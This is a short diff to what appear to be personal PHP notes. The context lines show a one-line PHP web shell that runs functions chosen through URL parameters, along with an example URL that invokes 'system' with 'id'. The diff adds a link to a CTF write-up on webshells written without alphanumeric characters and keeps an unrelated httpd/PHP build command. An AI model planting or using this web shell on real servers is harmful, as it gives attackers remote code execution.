@@ -136,6 +136,9 @@ http://...?ctime=system&atime=id
 * simple
 <?php $_GET['a']($_GET['b']); ?>
 
+* webshell without letters, numbers or semi-colon
+https://0xparrot.github.io/blog/ctf/2020/05/05/PHP-Webshell-without-alphanumeric-and-semi-colon/
+
 # build httpd + php with support for mysql, oci and mssql
 ~/code/src/php-5-3.10 $ ./configure  --prefix=/opt/m/php/php-5.3.10 --with-apxs2=/opt/m/httpd/httpd-2.4.1/bin/apxs --with-oci8=shared,/u01/app/oracle/product/11.2.0/xe --with-mysql=mysqlnd --with-mssql=/home/seb/code/src/freetds-0.91/opt/
 
